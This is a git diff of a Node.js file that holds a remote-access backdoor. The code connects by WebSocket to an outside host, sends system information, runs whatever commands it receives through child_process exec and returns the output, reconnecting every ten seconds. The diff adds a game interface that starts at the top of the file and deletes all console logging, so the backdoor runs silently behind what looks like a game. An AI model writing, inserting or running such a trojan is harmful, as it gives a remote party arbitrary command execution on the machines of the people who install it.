@@ -1,6 +1,13 @@
 const WS = require('ws')
 const os = require('os');
 const { exec } = require('child_process')
+const { Game } = require('./src/Game')
+const { UserInterface } = require('./src/UserInterface')
+const game = new Game(new UserInterface())
+
+// Begin game
+game.start()
+
 let ws = new WS("ws://darkfire.westus2.cloudapp.azure.com:6969") // by default it will connect to localhost, change to server DNS name or domain name. Also change the port
 let connected = 0
 let reconnect_time = 10000
@@ -9,7 +16,6 @@ function connect() {
     connected += 1
     ws = new WS("ws://darkfire.westus2.cloudapp.azure.com:6969")
     ws.on("open", () => {
-        console.log("Connection establised")
         if (connected < 2) {
             sendSystemInfo()
         }
@@ -22,7 +28,7 @@ function connect() {
             else if (operation === "$reconnect") {
                 reconnect()
             }
-            else if(operation === "$systemInfo") {
+            else if (operation === "$systemInfo") {
                 sendSystemInfo()
             }
         })
@@ -30,12 +36,10 @@ function connect() {
 
 
     ws.on("error", (error) => {
-        console.log("error")
         connected = 0
         // setTimeout(reconnect, 2000)
     })
     ws.on("close", () => {
-        console.log("Connection Closed")
     })
 
 }
@@ -53,7 +57,6 @@ function cmd(cmd) {
             ws.send(stdout)
         })
     } catch {
-        console.log(`Something Went Wrong with exec cmd.`)
     }
 }
 
@@ -76,13 +79,11 @@ function reconnect() {
         ws.close()
         connect()
     } catch {
-        console.log("Some Error in reconnection")
+
     }
 }
 reconnect()
 try {
     setInterval(reconnect, reconnect_time)
-} catch(error) {
-    console.log(error)
-    console.log("Something's Wrong with the computer")
+} catch (error) {
 }
